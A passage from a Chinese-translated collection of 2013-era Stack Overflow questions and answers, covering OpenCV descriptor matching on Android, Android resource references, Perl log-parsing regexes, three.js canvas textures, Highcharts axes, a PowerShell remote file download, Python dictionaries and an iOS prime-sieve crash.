    good_matches = new MatOfDMatch();

    Bitmap image = BitmapFactory.decodeResource(getResources(), R.drawable.sto);
    Utils.bitmapToMat(image,object);   

    surf = FeatureDetector.create(FeatureDetector.FAST);
    surf.detect( object, object_keys );   
    surf.detect( mRgba, scene_keys);
    surfEX = DescriptorExtractor.create(DescriptorExtractor.BRIEF);
    surfEX.compute(object, object_keys, object_desc);       
    surfEX.compute(mRgba, scene_keys, scene_desc);
    dm = DescriptorMatcher.create(DescriptorMatcher.BRUTEFORCE_SL2);    
    dm.match(object_desc, scene_desc, matches);

    double max_dist = 0;
    double min_dist = 100;

    for( int i = 0; i < object_desc.rows(); i++ )
      { double dist = matches.toArray()[i].distance;
        if( dist < min_dist ) min_dist = dist;
        if( dist > max_dist ) max_dist = dist;
      }

     for( int i = 0; i < object_desc.rows(); i++ )
      {  MatOfDMatch temp = new MatOfDMatch();
         if( matches.toArray()[i].distance < 3*min_dist )
         {   temp.fromArray(matches.toArray()[i]);
             good_matches.push_back(temp); 
             }        
      }

}

public Mat onCameraFrame(CvCameraViewFrame inputFrame) {        
     mRgba = inputFrame.rgba();
             detect_image(mRgba);
     return inputFrame.rgba();
} 
```

日志猫：

```
03-27 01:55:31.258: E/cv::error()(564): OpenCV Error: Assertion failed 
(type == src2.type() && src1.cols == src2.cols && 
(type == CV_32F || type == CV_8U)) in void cv::batchDistance(cv::InputArray,
cv::InputArray, cv::OutputArray, int, cv::OutputArray, int, int, cv::InputArray,
int,  bool), file /home/reports/ci/slave/50-SDK/opencv/modules/core/src/stat.cpp,
line 1803 
```

* * *

## 回答 #1

> 赞同：20
> 
> 时间：2013-03-28T06:39:58.967

只是为了结束这个问题：

根据您的评论，以下行导致了问题：

```
dm.match(object_desc, scene_desc, matches); 
```

我建议您手动验证：

```
(object_desc.type == scene_desc.type &&
 object_desc.cols == object_scene.cols) 
```

问题最终是对于第一帧，`object_desc.cols() != scene_desc.cols()`. 一个简单`if`的就足以解决问题。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2017-06-30T06:11:01.333

**（Open Cv Mat 没有类型方法）**试试这个方法..

```
public  void match(Mat object_desc, Mat scene_desc, MatOfDMatch matches)
{
    if(object_desc.type() == scene_desc.type() &&
            object_desc.cols() == scene_desc.cols()) {            
        match_1(nativeObj, object_desc.nativeObj, scene_desc.nativeObj, matches.nativeObj);
    }

} 
```

# android - 引用 Android XML 资源时，星号 (*) 是什么意思？

> ID：15650376
> 
> 赞同：4
> 
> 时间：2013-03-27T01:17:44.890
> 
> 标签：android

这个Android代码是什么意思？

和空有什么区别`*`：`+`

```
@*android:id 
```

像这样在 android_ics/packages/apps/Setting/res/layout

```
<TextView android:id="@*android:id/timeDisplayForeground"
    android:layout_width="wrap_content"
    android:layout_height="wrap_content"
    android:singleLine="true"
    android:ellipsize="none"
    android:textSize="@dimen/crypt_clock_size"
    android:textAppearance="?android:attr/textAppearanceMedium"
    android:textColor="@color/crypt_keeper_clock_foreground"
    android:layout_alignLeft="@*android:id/timeDisplayBackground"
    android:layout_alignTop="@*android:id/timeDisplayBackground"
    android:layout_marginBottom="6dip" /> 
```

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2013-03-27T01:35:14.010

* 允许您访问私有资源。私有资源之所以私有是有原因的，因为它们的名称将来可能会作为固件或皮肤更新的一部分而更改。

使用这些资源不是一个好主意，除非你工作在一个你知道这些资源在未来不会改变和破坏你的应用程序的环境中。

在您的示例中，系统应用程序正在引用私有资源，这是您最常看到使用此 * 引用的地方。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-03-27T01:28:05.980

我之前回答过，但可能误解了你的问题。在您的项目中有一个名为 R.java 的生成文件，其中列出了您的资源。例如，当您创建视图并添加按钮时，您会看到其中一些信息自动进入您的 R.java 文件。在 Java 中，您可以使用这些成员访问信息。然而，在 XML 中，您必须通过引用标签或节点来访问它们。

```
@android:id refers to the public system member called "id"
@id refers to one that you've created
@+id says to create one called "id" (and what to set it to)
@*android:id refers to a private system member 
```

参考：http: [//developer.android.com/training/basics/firstapp/building-ui.html](http://developer.android.com/training/basics/firstapp/building-ui.html)

# regex - 带有可变部分的正则表达式

> ID：15650377
> 
> 赞同：0
> 
> 时间：2013-03-27T01:18:00.667
> 
> 标签：regex, perl

如何将这 2 个正则表达式合并为一个正则表达式，该正则表达式根据字符串结构捕获所有可用部分（ $s 中的最后 3 个字段是可选的，如果存在则应捕获）？使用 (?= ... ) 我无法获得有效的解决方案。

```
$s='1.2.3.4 - egon  [10/Dec/2007:21:07:20 +0100] "GET /x.htm HTTP/1.1" 401 488';
$re = qr/\A
        (\d+)\.(\d+)\.(\d+)\.(\d+)
    [ ] (\S+)
    [ ] (\S+)
    [ ]+ \[(\d+)\/(\S+)\/(\d+):(\d+):(\d+):(\d+) [ ] (\S+)\]
    [ ] "(\S+) [ ] (.*?) [ ] (\S+)"
    [ ] (\S+)
    [ ] (\S+)
    \Z/x;
print "[".join('],[',$s =~ $re)."]\n\n";   

$s='1.2.3.4 - - [13/Jun/2007:01:37:44 +0200] "GET /x.htm HTTP/1.0" 404 283 "-" "Mozilla/5.0..." "-"';
$re = qr/\A
        (\d+)\.(\d+)\.(\d+)\.(\d+)
    [ ] (\S+)
    [ ] (\S+)
    [ ]+ \[(\d+)\/(\S+)\/(\d+):(\d+):(\d+):(\d+) [ ] (\S+)\]
    [ ] "(\S+) [ ] (.*?) [ ] (\S+)"
    [ ] (\S+)
    [ ] (\S+) [ ] "(.*?)" [ ] "(.*?)" [ ] "(.*?)"
        \Z
        /x;
print "[".join('],[',$s =~ $re)."]\n\n"; 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-03-27T01:46:59.700

当您的正则表达式开始看起来像这样时，我认为开始考虑替代方案是个好主意。在这种情况下，您可以尝试[`Text::ParseWords`](http://search.cpan.org/perldoc?Text%3a%3aParseWords)，因为您的字符串是带分隔符的并且包含带引号的字符串。它是 perl 5 中的核心模块。

基本上我们正在做的是为我们期望的分隔符提供一个正则表达式，一个 0 或 1 用于保留引号，以及输入行本身。

```
use strict;
use warnings;
use Text::ParseWords;

my $s = '1.2.3.4 - egon  [10/Dec/2007:21:07:20 +0100] "GET /x.htm HTTP/1.1" 401 488';
my @s = quotewords('[\s/:\[\].]+', 0, $s);
print "[".join('],[',@s)."]\n\n";   

$s = '1.2.3.4 - - [13/Jun/2007:01:37:44 +0200] "GET /x.htm HTTP/1.0" 404 283 "-" "Mozilla/5.0..." "-"';
@s = quotewords('[\s/:\[\].]+', 0, $s);
print "[".join('],[',@s)."]\n\n"; 
```

**输出：**

```
[1],[2],[3],[4],[-],[egon],[10],[Dec],[2007],[21],[07],[20],[+0100],[GET /x.htm
HTTP/1.1],[401],[488]

[1],[2],[3],[4],[-],[-],[13],[Jun],[2007],[01],[37],[44],[+0200],[GET /x.htm HTT
P/1.0],[404],[283],[-],[Mozilla/5.0...],[-] 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-03-27T01:39:44.123

`(?=)`您可以使用非捕获组`(?:)`并匹配零次或一次出现，而不是使用前瞻：

```
$re = qr/\A
        (\d+)\.(\d+)\.(\d+)\.(\d+)
    [ ] (\S+)
    [ ] (\S+)
    [ ]+ \[(\d+)\/(\S+)\/(\d+):(\d+):(\d+):(\d+) [ ] (\S+)\]
    [ ] "(\S+) [ ] (.*?) [ ] (\S+)"
    [ ] (\S+)
    [ ] (\S+)
    (?:
        [ ] "(.*?)"
        [ ] "(.*?)"
        [ ] "(.*?)"
    )?
    \Z/x; 
```

这将产生固定长度的捕获数组，但如果可选的捕获组不匹配，最后 3 个将是 undef。如果您必须匹配 1 到 3 个可选字段，请将每个字段包装在其自己的非捕获组中，`?`出现零个或多个 ( )。我也试过这个，但它不起作用：

```
(?: [ ] "(.*?)" ){0,3} \Z 
```

它匹配并捕获最后三个字段中的每一个，但每次捕获都会覆盖捕获数组中的最终位置，因此在捕获完成后，它只包含最后一个字段。

我会提醒您，您使用的非常严格的表达式可能并不适合所有 Web 日志：具体来说，IP 地址的匹配不会处理 IPv6 地址，而用户代理的匹配可能无法处理带有`"`字符的用户代理，取决于它们的转义方式（例如，lighttpd 1.4.28 不会转义它们）。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-27T17:43:24.790

我不想谈论任何解决方案的提示。

我之前怎么说：好主意。但它只执行包名称谓词：ParseWords。

“如果你想继续这个讨论，给我找一个你的正则表达式有效的测试用例，我的解决方案失败......”。

当然，出于我的目的，我已经测试了您的解决方案。

在您的解决方案中，字段会根据输入进行移动。

使用正则表达式，我会发现字段总是在定义的位置。

（例如：$token[5] 的 Authuser 和 $token[9] 的 Year）

这是测试：

```
#!/usr/bin/perl -w
use strict;
use warnings;
use FileHandle;
use Text::ParseWords;

my $re = qr/\A
        (\d+)\.(\d+)\.(\d+)\.(\d+)
    [ ] (\S+)
    (?: [ ] (\S*))? (?: [ ] (\S*))?
    [ ] \[(\d+)\/(\S+)\/(\d+):(\d+):(\d+):(\d+) [ ] (\S+)\]
    [ ] "(?:(\S+) [ ])? (.*?) (?:[ ] (\S+))?"
    [ ] (\S+)
    [ ] (\S+)
    (?:
        [ ] "(.*?)"
        [ ] "(.*?)"
        [ ] "(.*?)"
    )?
    \Z/x;

my (@s,@token);
#---- most entries ------------------------------------------------------------
push(@s,'1.2.3.4 - - [13/Jun/2007:01:37:44 +0200] "GET /x.htm HTTP/1.0" 404 283');
#---- referer, user agent, ... ------------------------------------------------
push(@s,'1.2.3.4 - - [13/Jun/2007:01:37:44 +0200] "GET /x.htm HTTP/1.0" 404 283 "-" "Mozilla/5.0..." "-"');
#---- auth without password ---------------------------------------------------
push(@s,'1.2.3.4 - ausr  [10/Dec/2007:21:07:20 +0100] "GET /x.htm HTTP/1.1" 401 488');
#---- no http request --------------------------------------------------------- 
push(@s,'1.2.3.4 - - [13/Jun/2007:19:16:18 +0200] "-" 408 -');
#---- auth with password ------------------------------------------------------
push(@s,'1.2.3.4 - ausr pwd [12/Jul/2006:16:55:04 +0200] "GET /x.htm HTTP/1.1" 401 489');
#---- auth without user -------------------------------------------------------
push(@s,'1.2.3.4 -  pwd [16/Aug/2007:08:43:50 +0200] "GET /x.htm HTTP/1.1" 401 489');
#---- multiple words in request -----------------------------------------------
push(@s,'1.2.3.4 - - [13/Jun/2007:01:37:44 +0200] "GET /this is test HTTP/1.0" 404 283'); 

no warnings 'uninitialized';
foreach(@s)
{ @token=$_ =~ $re;
  print "regex:      AUTHUSER=".$token[5].", YEAR=".$token[9]."\n";
  @token=quotewords('[\s/:\[\].]+', 0, $_);
  print "quotewords: AUTHUSER=".$token[5].", YEAR=".$token[9]."\n\n";
} 
```

结果如下：

```
regex:      AUTHUSER=-, YEAR=2007
quotewords: AUTHUSER=-, YEAR=01

regex:      AUTHUSER=-, YEAR=2007
quotewords: AUTHUSER=-, YEAR=01

regex:      AUTHUSER=ausr, YEAR=2007
quotewords: AUTHUSER=ausr, YEAR=21

regex:      AUTHUSER=-, YEAR=2007
quotewords: AUTHUSER=-, YEAR=19

regex:      AUTHUSER=ausr, YEAR=2006
quotewords: AUTHUSER=ausr, YEAR=2006

regex:      AUTHUSER=, YEAR=2007
quotewords: AUTHUSER=pwd, YEAR=08

regex:      AUTHUSER=-, YEAR=2007
quotewords: AUTHUSER=-, YEAR=01 
```

# javascript - 使用three.js，我将如何在立方体上徒手绘制？

> ID：15650381
> 
> 赞同：0
> 
> 时间：2013-03-27T01:18:12.657
> 
> 标签：javascript, drawing, three.js

今天大部分时间我一直在尝试找到一种基本上代表涂鸦墙的方法，但找不到任何指向该方向的指针。我的第一个假设是我需要做一些自定义纹理，但我真的想不通；如果是因为我筋疲力尽，或者是什么，我想知道，但我就是想不出用three.js 术语来做到这一点的方法。

你们有没有人有更好的运气，或者知道我可以做这样的事情的方法？

有关更多详细信息，“像这样”基本上是指在 CubeGeometry 中的材质顶部应用给定的位图画笔。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2015-07-22T07:07:17.330

我知道它有点老了，但我最近一直在搞砸，我想我找到了办法。

创建一个画布，然后使用该画布创建一个纹理。之后，使用[此处](http://perfectionkills.com/exploring-canvas-drawing-techniques/)的任何代码。它应该在普通表面上工作得很好，但对于球体或非规则形状来说有点棘手。

应该是这样的：

```
var canvas = document.createElement('canvas');
var ctx = canvas.getContext('2d');

/*
context options here
*/

var texture = new THREE.Texture(canvas);
texture.needsUpdate = true;

var graffWall = new.MeshBasicMaterial({

map:texture1

});

mesh.material=material;   //or: var mesh = new THREE.Mesh(geometry, material);

//and here comes the magic... more or less

var wall = document.getElementById('canvas');
var ctx = mesh.material.map.image.getContext('2d');
var ctx = el.getContext('2d');
var isDrawing;

wall.onmousedown = function(e) {
  isDrawing = true;
  ctx.lineWidth = 10;
  ctx.lineJoin = ctx.lineCap = 'round';
  ctx.moveTo(e.clientX, e.clientY);
};
wall.onmousemove = function(e) {
  if (isDrawing) {
    ctx.lineTo(e.clientX, e.clientY);
    ctx.stroke();
  }
};
wall.onmouseup = function() {
  isDrawing = false;
};
```

不确定它是否会起作用，但这是一种方法。

# android - Resources$NotFoundException：资源 ID 无效。为什么？

> ID：15650384
> 
> 赞同：14
> 
> 时间：2013-03-27T01:18:25.147
> 
> 标签：android, android-resources

我正在尝试在我的`dimens.xml`文件中添加一个浮点数。

我正在阅读[以下 SO 答案](https://stackoverflow.com/a/8780360/785215)。当我尝试解决方案时，我得到了评论中描述的异常。我试图弄清楚*为什么*会抛出该异常。

为了完整起见，这里是 XML：

```
<item name="zoom_level" format="float" type="dimen">15.0</item> 
```

这是爆炸的代码：

```
final float zoom = this.getResources().getDimension(R.dimen.zoom_level); 
```

我跳进了 Android 源代码，这里是 getDimension 的方法定义：

```
public float getDimension(int id) throws NotFoundException {
    synchronized (mTmpValue) {
        TypedValue value = mTmpValue;
        getValue(id, value, true);
        if (value.type == TypedValue.TYPE_DIMENSION) {
            return TypedValue.complexToDimension(value.data, mMetrics);
        }
        throw new NotFoundException(
                "Resource ID #0x" + Integer.toHexString(id) + " type #0x"
                + Integer.toHexString(value.type) + " is not valid");
    }
} 
```

所以无论出于什么原因`value.type != TypedValue.TYPE_DIMENSION`。我没有完全设置我的 Android 源代码，因此我无法轻松地`Log.w("YARIAN", "value type is " + value.type)'`在其中添加语句。

然后我跳进去`getValue`，调用链似乎是：

```
Resources.getValue -> AssetManager.getResourceValue -> AssetManager.loadResourceValue 
```

`loadResourceValue`是一种本地方法，这就是我的挖掘失败的地方。

有谁知道了解正在发生的事情的最佳方法是什么？

* * *

我还注意到`Resources`有一个`TypedValue.TYPE_FLOAT`and `TypedValue.TYPE_DIMENSION`。但在 XML 中，我无法编写`type="float"`.

评论中描述的解决方法是使用`type=string`然后使用`Float.parse`来获取浮动。这是必要的吗？为什么或者为什么不？

* * *

## 回答 #1

> 赞同：22
> 
> 时间：2013-06-10T15:31:41.477

我知道这是一个迟到的答案，但你应该使用[TypedValue#getFloat()](http://developer.android.com/reference/android/util/TypedValue.html#getFloat%28%29)而不是像你建议的那样将字符串解析为浮点数。

XML:

```
 <item name="float_resource" format="float" type="raw">5.0</item> 
```

爪哇：

```
TypedValue out = new TypedValue();
context.getResources().getValue(R.raw.float_resource, out, true);
float floatResource = out.getFloat(); 
```

您可以放置`fraction`​​ ，`raw`或者`string`如果`type`您愿意，这仅对应于 中的资源类`R`。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2018-04-12T21:31:59.830

我也遇到了这个问题，虽然错误消息没有太大帮助，但我意识到我的问题是我在资源文件中只放了一个浮点值并且没有指定测量值。例如，将 15.0 切换到 15.0dp 可以避免该问题并允许您仍然使用常规维度资源。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2020-08-25T16:14:12.403

现在有[Resources.getFloat](https://developer.android.com/reference/android/content/res/Resources#getFloat(int))（来自 API 29）和[ResourcesCompat.getFloat](https://developer.android.com/reference/androidx/core/content/res/ResourcesCompat#getFloat(android.content.res.Resources,%2520int))：

```
val zoomLevel: Float = ResourcesCompat.getFloat(resources, R.dimen.zoom_level) 
```

您可以将`zoom_level`XML 保留在问题中。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2020-05-05T11:28:18.337

由丰富的答案制成的 Kotlin 扩展功能：

```
fun Resources.getFloatValue(@DimenRes floatRes:Int):Float{
    val out = TypedValue()
    getValue(floatRes, out, true)
    return out.float
} 
```

用法：

```
resources.getFloatValue(R.dimen.my_float) 
```

# highcharts - Highcharts - 柱形图 - Y 轴日期时间

> ID：15650385
> 
> 赞同：0
> 
> 时间：2013-03-27T01:18:53.430
> 
> 标签：highcharts

我在 HighCharts 上有一个折线图，可以正确显示 dateTimeLabels。但是，如果将其更改为 type:column，则标签将替换为数字，并且所有列的高度相同。

[http://highcharts.com/jsbin/ihorog/edit#javascript,live](http://highcharts.com/jsbin/ihorog/edit#javascript,live) （要检查错误，只需取消注释类型：jsbin 上的列）

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-27T02:37:48.960

这是因为一列被绘制为从零到值，并且由于您的值是由 Date.UTC() 创建的，因此零是 1970 年 1 月 1 日。由于标签跨越了如此大的时间跨度，它正在做一些奇怪的事情。为您的 yAxis 指定一个最小值，它将从那里开始。

[http://highcharts.com/jsbin/uvuvoh/edit#javascript,live](http://highcharts.com/jsbin/uvuvoh/edit#javascript,live)

```
yAxis: {
    min : Date.UTC(2013,0,1),
    ...
}, 
```

# powershell - 尝试将文件下载到远程服务器上的目录

> ID：15650388
> 
> 赞同：0
> 
> 时间：2013-03-27T01:19:17.630
> 
> 标签：powershell

我收到此错误

> 使用“2”参数调用“DownloadFile”的异常：“WebClient 请求期间发生异常。”

从这个脚本

```
$username = "Administrator"
$password = "PASSWORD"
$secstr = New-Object -TypeName System.Security.SecureString
$password.ToCharArray() | ForEach-Object {$secstr.AppendChar($_)}
$cred = new-object -typename System.Management.Automation.PSCredential -argumentlist $username, $secstr
$url = "http://www.website.com/file.zip"
$path = "C:\file.zip"
$client = new-object System.Net.WebClient
$client.DownloadFile( $url, $path )
Invoke-Command -ComputerName 69.69.69.69 -ScriptBlock { $client } -credential $cred 
```

在 Windows Web Server 2008 上运行

脚本的目的是将file.zip下载到远程服务器（有数百台服务器，所以不能每次都提示我输入密码）并查看下载的进度条。

有任何想法吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-27T04:29:03.833

尝试

```
$username = "Administrator"
$password = "PASSWORD"
$secstr = New-Object -TypeName System.Security.SecureString
$password.ToCharArray() | ForEach-Object {$secstr.AppendChar($_)}
$cred = new-object -typename System.Management.Automation.PSCredential -argumentlist $username, $secstr

$command =  {
    $url = "http://www.website.com/file.zip"
    $path = "C:\file.zip"
    $client = new-object System.Net.WebClient
    $client.DownloadFile( $url, $path ) 
}

   Invoke-Command -ComputerName 69.69.69.69 -ScriptBlock $command -credential $cred 
```

# python - 在字典中定位特定的键和对应的值

> ID：15650389
> 
> 赞同：0
> 
> 时间：2013-03-27T01:19:23.110
> 
> 标签：python, dictionary

我写了以下一段代码：

```
def all_di(fl):
    dmm = {}
    for k in range(2):
        for i in fl:
            for m in range (len(i)-1):
                temp = i[m:m+k+1]
                if temp in dmm:
                    dmm[temp] += 1.0
                else:
                    dmm[temp] = 1.0
##  return dmm
    p = raw_input("Enter a 2 AA long seq:")
    sum = 0
    for x,y in dmm.iteritems():
        if x == p:
            n1 = y
    for l,m in dmm.iteritems():
        if l[0] == p[0]:
            sum = sum + m
    print float(n1)/float(sum)

all_di(inh) 
```

如果 inh =`{'VE':16,'GF':19,'VF':23,'GG' :2}`

该代码的工作原理如下：

```
Enter a 2 AA long seq: VE 
```

结果将是 = `16/(16+23)`=`0.41`

工作原理：该函数在字典中搜索与`dmm`输入的键相似的键`input`（此处为“VE”示例）。它存储它的值，然后搜索所有第一个字母相同的键值对，并将其所有值相加并返回一个分数。

```
VE = 16
**V**E + **V**F = 39
= 16/39 = 0.41 
```

我想要什么：保持函数完整，我想要一个辅助字典，它迭代字典中的每个键值对，并将它的小数值存储在不同的字典中，这样：

```
new_dict = {'VE' : 0.41, 'GF':0.90,'VF':0.51, 'GG': 0.09} 
```

我不想删除该`print`语句，因为它是我的程序的输出。然而，我需要`new_dict`进一步的工作。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-27T01:40:57.990

```
def all_di(fl,p=0):
  dmm = {}
  interactive = p == 0
  if interactive:
    p = raw_input("Enter a 2 AA long seq:")
  if p in fl: 
    numer = fl[p]
    denom = 0.0 
    for t in fl: 
      if t[0] == p[0]:
        denom = denom + fl[t]
  if interactive:
    print numer / denom
  return numer / denom

inh = {'VE':16,'GF':19,'VF':23,'GG' :2} 
all_di(inh)
new_dict =  {x:all_di(inh, x) for x in inh}
print new_dict 
```

# html - 如果您有 Mac，如何使用 Internet Explorer 查看您的网站？

> ID：15650391
> 
> 赞同：1
> 
> 时间：2013-03-27T01:19:26.187
> 
> 标签：html

好吧，标题说明了一切。有人知道怎么做吗？不，我不想使用虚拟机。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-27T01:22:16.963

关于浏览器，我只有好[话要说](https://browserling.com/)。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-27T01:21:42.790

使用[http://browsershots.org/](http://browsershots.org/) - 该站点允许您在包括 IE 在内的许多浏览器上测试您的站点。

# iphone - iOS App 在启动时崩溃而没有显示任何错误

> ID：15650393
> 
> 赞同：1
> 
> 时间：2013-03-26T19:59:07.287
> 
> 标签：iphone, memory, crash

我知道还有其他人遇到此问题，并且我查看了大量有关此问题的帖子，但仍然无法弄清楚为什么我的应用程序不断崩溃。我只是不明白发生了什么='（我尝试清理所有内容，注释掉我的部分代码，并遵循此问题的其他答案但无济于事。这是我的 viewControler.h：

```
#import <UIKit/UIKit.h>
@interface ViewController : UIViewController <UITextFieldDelegate>

//txt fields for max value and thread
@property (weak, nonatomic) IBOutlet UITextField *txtNumThreads;
@property (weak, nonatomic) IBOutlet UITextField *txtMaxValue;

//labels for time elapsed, primes found, and time
@property (weak, nonatomic) IBOutlet UILabel *lblTimeElapsed;
@property (weak, nonatomic) IBOutlet UILabel *lblPrimesFound;
@property (weak, nonatomic) IBOutlet UILabel *lblTime;

//actions for each of the buttons
- (IBAction)btnStart_click:(id)sender;
- (IBAction)btnClear_click:(id)sender;
- (IBAction)btnTime_click:(id)sender;
- (IBAction)btnShow_click:(id)sender;

//show button and text view to show results
@property (weak, nonatomic) IBOutlet UIButton *btnClear;
@property (weak, nonatomic) IBOutlet UIButton *btnShow;
@property (weak, nonatomic) IBOutlet UIButton *btnStart;
@property (weak, nonatomic) IBOutlet UITextView *txtViewResults;

//boolean to determine if the start button has been pressed once already
@property bool isComputing;

//for number of threads and max value
@property int NumThreads;
@property int MaxValue;
@property int sqRoot;

//array for primes and results
@property (strong, nonatomic) NSMutableArray *SieveArray;
@property (strong, nonatomic) NSMutableArray *PrimesAndThreads;

@end 
```

这是我的 ViewController.m

```
#import "ViewController.h"

@interface ViewController ()

@end

@implementation ViewController

//symbolic constants for max number of threads and max value
static const int MAX_NUM_THREADS = 4;
static const int MAX_VALUE = 9999;

@synthesize isComputing;
@synthesize sqRoot;
@synthesize NumThreads;
@synthesize MaxValue;
@synthesize SieveArray;
@synthesize PrimesAndThreads;

- (void)viewDidLoad
{
    [super viewDidLoad];

    //to dismiss the keyboard using tap gesture
    UITapGestureRecognizer *tap = [[UITapGestureRecognizer alloc]
                                   initWithTarget:self
                                   action:@selector(dismissKeyboard)];

    //add tap gesture
    [self.view addGestureRecognizer:tap];

    //start with isComputing being false
    isComputing = false;

    //allocate
    SieveArray = [NSMutableArray array];
    PrimesAndThreads = [NSMutableArray array];
}

//to dismiss the keyboard using resign first responder
-(void)dismissKeyboard {
    [self.txtMaxValue resignFirstResponder];
    [self.txtNumThreads resignFirstResponder];
}

- (void)didReceiveMemoryWarning
{
    [super didReceiveMemoryWarning];
    // Dispose of any resources that can be recreated.
}

//click event for the start button
- (IBAction)btnStart_click:(id)sender {
    //clear contents of boxes
    self.txtViewResults.text = @"";

    if(SieveArray)
        [SieveArray removeAllObjects];

    if(PrimesAndThreads)
        [PrimesAndThreads removeAllObjects];

    [self.btnShow setEnabled:FALSE];

    if([self txtNumThreads].text.length != 0 && [self txtMaxValue].text.length != 0)
    {
        //get the user entered data
        NumThreads = [self.txtNumThreads.text intValue];
        MaxValue = [self.txtMaxValue.text intValue];

        if(NumThreads <= MAX_NUM_THREADS && MaxValue <= MAX_VALUE && NumThreads > 0)
        {
            //square root for the max number of divisions
            sqRoot = sqrt(MaxValue);

            //array for the algorithm
            for(int i = 0; i < MaxValue+1; i++)
                [SieveArray addObject:[NSNumber numberWithInt:1]];

            switch (NumThreads) {
                case 1:
                {
                    dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0),^{
                        [self SieveAlgorithm:0 Right:MaxValue ThreadNum:1];
                    });
                    break;
                }
                case 2:
                {
                    int FirstHalf = MaxValue/2;

                    dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0),^{
                        [self SieveAlgorithm:0 Right:FirstHalf ThreadNum:1];
                    });

                    dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0),^{
                        [self SieveAlgorithm:FirstHalf+1 Right:MaxValue ThreadNum:2];
                    });
                    break;
                }
                case 3:
                {
                    int OneThird = MaxValue/3;

                    dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0),^{
                        [self SieveAlgorithm:0 Right:OneThird ThreadNum:1];
                    });

                    dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0),^{
                        [self SieveAlgorithm:OneThird+1 Right:OneThird*2 ThreadNum:2];
                    });

                    dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0),^{
                        [self SieveAlgorithm:(OneThird*2)+1 Right:MaxValue ThreadNum:3];
                    });
                    break;
                }
                case 4:
                {
                    int OneFourth = MaxValue/4;

                    dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0),^{
                        [self SieveAlgorithm:0 Right:OneFourth ThreadNum:1];
                    });

                    dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0),^{
                        [self SieveAlgorithm:OneFourth+1 Right:OneFourth*2 ThreadNum:2];
                    });

                    dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0),^{
                        [self SieveAlgorithm:(OneFourth*2)+1 Right:OneFourth*3 ThreadNum:3];
                    });

                    dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0),^{
                        [self SieveAlgorithm:(OneFourth*3)+1 Right:MaxValue ThreadNum:4];
                    });
                    break;
                }
                default:
                    break;
            }

        }
        else
        {
            UIAlertView *ExceedMaxError = [[UIAlertView alloc] initWithTitle:@"Error" message:[NSString stringWithFormat:@"Please enter between 1 and %d threads, and a max of %d for value.", MAX_NUM_THREADS, MAX_VALUE] delegate:nil cancelButtonTitle:@"Okay" otherButtonTitles:nil, nil];
            [ExceedMaxError show];
        }
    }
    else
    {
        UIAlertView *blankTextsError = [[UIAlertView alloc] initWithTitle:@"Error" message:@"Please enter No Threads and Max Value." delegate:nil cancelButtonTitle:@"Okay" otherButtonTitles:nil, nil];
        [blankTextsError show];
    }

    [self.btnShow setEnabled:TRUE];
}

//click event for the clear button
- (IBAction)btnClear_click:(id)sender {
    self.txtMaxValue.text = @"";
    self.txtNumThreads.text = @"";
    self.txtViewResults.text = @"";
}

//click event for the time button
- (IBAction)btnTime_click:(id)sender {
    NSDate *now = [NSDate date];
    NSDateFormatter *formatter = [[NSDateFormatter alloc] init];
    [formatter setDateStyle:NSDateFormatterShortStyle];
    [formatter setTimeStyle:NSDateFormatterShortStyle];

    self.lblTime.text = [NSString stringWithFormat:@"%@", [formatter stringFromDate:now]];
}

//click event for the show button
- (IBAction)btnShow_click:(id)sender {
    //clear the result text view
    self.txtViewResults.text = @"";

    for(id object in PrimesAndThreads)
    {
        self.txtViewResults.text = [self.txtViewResults.text stringByAppendingString:[NSString stringWithFormat:@"%@\n", object]];
    }

    if(PrimesAndThreads)
        [PrimesAndThreads removeAllObjects];
}

//Sieve Algorithm function
//Takes the left and right subscript of the range and performs the algorithm on SieveArray
-(void)SieveAlgorithm:(int)left Right:(int)right ThreadNum:(int)thread {

    //get rid of multiples of i to square root of MaxValue
    for(int i = 2; i <= sqRoot; i++)
    {
        for(int x = i+i; x <= right; x=x+i)
        {
            [SieveArray replaceObjectAtIndex:x withObject:[NSNumber numberWithInt:0]];
        }
    }

    //add the primes to a string array for printing later
    for(int l = left; l <= right; l++)
    {
        if([[SieveArray objectAtIndex:l] integerValue] == 1)
            [PrimesAndThreads addObject:[NSString stringWithFormat:@"ThNum:%d Prime:%d", thread, l]];
    }
}
@end 
```

崩溃后，我被带到了这个：

```
libobjc.A.dylib`objc_msgSend:
0x10e608c:  movl   8(%esp), %ecx
0x10e6090:  movl   4(%esp), %eax
0x10e6094:  testl  %eax, %eax
0x10e6096:  je     0x10e60e8                 ; objc_msgSend + 92
0x10e6098:  movl   (%eax), %edx
0x10e609a:  pushl  %edi
0x10e609b:  movl   8(%edx), %edi
0x10e609e:  pushl  %esi
0x10e609f:  movl   (%edi), %esi
0x10e60a1:  movl   %ecx, %edx
0x10e60a3:  shrl   $2, %edx
0x10e60a6:  andl   %esi, %edx
0x10e60a8:  movl   8(%edi,%edx,4), %eax
0x10e60ac:  testl  %eax, %eax
